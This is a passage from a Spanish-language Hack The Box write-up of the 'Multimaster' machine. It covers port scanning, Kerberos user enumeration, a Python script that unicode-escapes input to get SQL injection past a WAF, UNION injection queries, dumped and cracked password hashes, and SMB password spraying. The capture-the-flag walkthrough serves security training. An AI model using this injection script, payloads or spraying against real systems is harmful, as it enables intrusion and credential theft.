80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 41.95 seconds
           Raw packets sent: 196589 (8.650MB) | Rcvd: 47 (2.068KB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;139 ldap&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; , &lt;code&gt;80 http&lt;/code&gt;, 88 &lt;code&gt;Kerberos&lt;/code&gt; y &lt;code&gt;5985 winrm&lt;/code&gt;, podemos asumir que nos enfrentaremos a un entorno de directorio activo.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10.10.10.179 -oN targets
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:35 GMT
Nmap scan report for 10.10.10.179
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-03-30T15:34:28
|_Not valid after:  2023-09-29T15:34:28
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-31T15:43:32+00:00
|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &amp;lt;blank&amp;gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-03-31T08:43:32-07:00
| smb2-time: 
|   date: 2023-03-31T15:43:36
|_  start_date: 2023-03-31T15:34:34
|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.97 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;KERBEROS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3389&lt;/td&gt;
      &lt;td&gt;RDP&lt;/td&gt;
      &lt;td&gt;Microsoft Terminal Services&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta &lt;code&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Añadimos el domain a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;10.10.10.179 MEGACORP.LOCAL&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros &lt;code&gt;-H&lt;/code&gt; para especificar el host y &lt;code&gt;-u&lt;/code&gt; para hacer uso de una sesion nula.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.179 -u 'null'
[!] Authentication error on 10.10.10.179
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con &lt;code&gt;rpcclient&lt;/code&gt; y de igual manera no tenemos acceso.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U &quot;&quot; 10.10.10.179 -N
rpcclient $&amp;gt; enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces procederemos a abrir la pagina web correspondiente a un &lt;code&gt;IIS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de enumerar un rato la pagina web, en la opcion &lt;code&gt;colleague finder&lt;/code&gt; realizamos una busqueda que nos reporta una lista de usuarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
sbauer
okent
ckane
kpage
shayna
james
rmartin
jorden
alyx
ilee
nbourne
zpowers
aldom
minato
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a validar si los usuarios son validos usando la herramienta &lt;code&gt;kerbrute&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ropnop/kerbrute&quot;&gt;https://github.com/ropnop/kerbrute&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /opt/kerbrute/kerbrute userenum --dc 10.10.10.179 -d MEGACORP.LOCAL users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop

2023/03/31 18:45:44 &amp;gt;  Using KDC(s):
2023/03/31 18:45:44 &amp;gt;  	10.10.10.179:88

2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	ckane@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	okent@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	sbauer@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	rmartin@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	kpage@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	james@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	jorden@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	ilee@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	alyx@MEGACORP.LOCAL
2023/03/31 18:45:44 &amp;gt;  [+] VALID USERNAME:	zpowers@MEGACORP.LOCAL
2023/03/31 18:45:45 &amp;gt;  [+] VALID USERNAME:	nbourne@MEGACORP.LOCAL
2023/03/31 18:45:45 &amp;gt;  [+] VALID USERNAME:	aldom@MEGACORP.LOCAL
2023/03/31 18:45:45 &amp;gt;  Done! Tested 14 usernames (12 valid) in 0.787 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un &lt;code&gt;ASREPRoast Attack&lt;/code&gt;, mediante el cual podemos solicituar un &lt;code&gt;TGT&lt;/code&gt; sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de &lt;code&gt;impakcet&lt;/code&gt; &lt;code&gt;GetNpUsers.py&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ropnop/kerbrute&quot;&gt;https://github.com/fortra/impacket&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Anteriormente veiamos que en &lt;code&gt;Colleague Finder&lt;/code&gt; teniamos un input que vamos a proceder a interceptar con &lt;code&gt;burpsite&lt;/code&gt; para tratar de causar un error en la consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cuando añadimos simbolos como la &lt;code&gt;'&lt;/code&gt;, nos manda un mensaje de error &lt;code&gt;403&lt;/code&gt; Forbidden y con otros simbolos un &lt;code&gt;200&lt;/code&gt; ok, asi que vamos a intentar realizar fuerza bruta con &lt;code&gt;wfuzz&lt;/code&gt; para entender que esta pasando, para ello usaremos un diccionario del repositorio de &lt;code&gt;danielmiessler&lt;/code&gt; llamado &lt;code&gt;special-chars.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{&quot;name&quot;:&quot;FUZZ&quot;}' -u http://10.10.10.179/api/getColleagues
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000007:   403        29 L     92 W       1233 Ch     &quot;^&quot;                                                                                                                    
000000015:   403        29 L     92 W       1233 Ch     &quot;=&quot;                                                                                                                    
000000003:   403        29 L     92 W       1233 Ch     &quot;@&quot;                                                                                                                    
000000001:   403        29 L     92 W       1233 Ch     &quot;~&quot;                                                                                                                    
000000016:   403        29 L     92 W       1233 Ch     &quot;{&quot;                                                                                                                    
000000014:   403        29 L     92 W       1233 Ch     &quot;+&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un &lt;code&gt;WAF&lt;/code&gt;, para ello con usos adicionaremos unos parametros &lt;code&gt;-s 1&lt;/code&gt;, para que mande una peticion por segundo y ocultaremos el codigo de estado &lt;code&gt;200&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/json;charset=utf-8' -d '{&quot;name&quot;:&quot;FUZZ&quot;}' -u http://10.10.10.179/api/getColleagues
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000004:   403        29 L     92 W       1233 Ch     &quot;#&quot;                                                                                                                    
000000021:   500        0 L      4 W        36 Ch       &quot;\&quot;                                                                                                                    
000000028:   403        29 L     92 W       1233 Ch     &quot;:&quot;                                                                                                                    
000000029:   403        29 L     92 W       1233 Ch     &quot;'&quot;                                                                                                                    
000000030:   403        29 L     92 W       1233 Ch     &quot;&quot;&quot;                                                                                                                    
000000031:   403        29 L     92 W       1233 Ch     &quot;&amp;lt;&quot;                                                                                                                    
000000032:   403        29 L     92 W       1233 Ch     &quot;&amp;gt;&quot;                                                                                                                    

Total time: 32.39251
Processed Requests: 32
Filtered Requests: 25
Requests/sec.: 0.987882
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al finalizar wfuzz nos muestra que la &lt;code&gt;\&lt;/code&gt; nos reporta un codigo de estado &lt;code&gt;500 Internal Server Error&lt;/code&gt;, que curiosamente usa &lt;code&gt;sqlmap&lt;/code&gt; con el nombre de &lt;code&gt;tamper&lt;/code&gt; para ofuzcar sus payloads como en el siguente ejemplo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt; &amp;gt;&amp;gt;&amp;gt; tamper('SELECT FIELD FROM TABLE')
    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A efectos practicos al mandar la peticion debemos usar &lt;code&gt;\\u00&lt;/code&gt; seguido de cada caracter en hexadecimal no es necesario usar tres  &lt;code&gt;\&lt;/code&gt; con uno basta.&lt;/p&gt;

&lt;p&gt;Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en &lt;code&gt;python3&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3

from pwn import *
import requests, time, json, signal

def def_handler(sig, frame):
    print(&quot;\n[!] Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c -&amp;gt; al presionar nos ejecuta la funcion def_handler
signal.signal(signal.SIGINT, def_handler)

#global_variables
main_url = &quot;http://10.10.10.179/api/getColleagues&quot;


#recibimos la data como input y la tratamos 
def recivesql(sqlinyection):
    sqlmodified = &quot;&quot;
    for character in sqlinyection:
        sqlmodified += &quot;\\u00&quot; + hex(ord(character))[2:]

    return sqlmodified

#realizamos la peticion enviando la data tratada y la representamos en formato json

def sendsql(sqlmodified):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    data_post = '{&quot;name&quot;: &quot;%s&quot;}' % sqlmodified
    
    
    r = requests.post(main_url, headers=headers, data=data_post)

    data_json = json.loads(r.text)

    return (json.dumps(data_json,indent=4))

if __name__ == '__main__':

#mediante un bucle recibimos la data como input

    while True:
        sqlinyection = input(&quot;&amp;gt; &quot;)
        sqlinyection = sqlinyection.strip()
        sqlmodified = recivesql(sqlinyection)
        response_json = sendsql(sqlmodified)

        print(response_json)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script y realizamos una inyeccion &lt;code&gt;sql&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 sql_inject.py
&amp;gt; ttest' union select 1,schema_name,3,4,5 from information_schema.schemata-- -
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_accessadmin&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_backupoperator&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_datareader&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_datawriter&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_ddladmin&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_denydatareader&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_denydatawriter&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_owner&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;db_securityadmin&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;dbo&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;guest&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;INFORMATION_SCHEMA&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    },
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;sys&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
        &quot;src&quot;: &quot;5&quot;
    }
]
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Enumerando la base de datos &lt;code&gt;dbo&lt;/code&gt; encontramos usuarios y contraseñas encriptadas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
ckane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
ilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
nbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
okent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
rmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
sbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos &lt;code&gt;hashcat&lt;/code&gt; para crackear los hashes, y logramos obtener 3 contraseñas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;password1
finance1
banking1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con &lt;code&gt;crackmapexec&lt;/code&gt; y nos reprota que ninguna es valida.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del &lt;code&gt;DC&lt;/code&gt; a partir de inyecciones.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; test' union select 1,default_domain(),3,4,5-- -
[
    {
        &quot;id&quot;: 1,
        &quot;name&quot;: &quot;MEGACORP&quot;,
        &quot;position&quot;: &quot;3&quot;,
        &quot;email&quot;: &quot;4&quot;,
